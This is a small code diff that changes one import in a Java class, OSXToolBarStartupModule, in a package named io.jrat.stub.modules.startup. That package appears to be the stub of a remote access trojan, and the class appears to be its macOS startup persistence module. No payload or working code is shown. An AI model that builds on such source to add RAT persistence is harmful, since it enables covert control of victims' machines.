@@ -1,8 +1,7 @@
 package io.jrat.stub.modules.startup;
 
 import java.util.Map;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 public class OSXToolBarStartupModule extends StartupModule {
 	
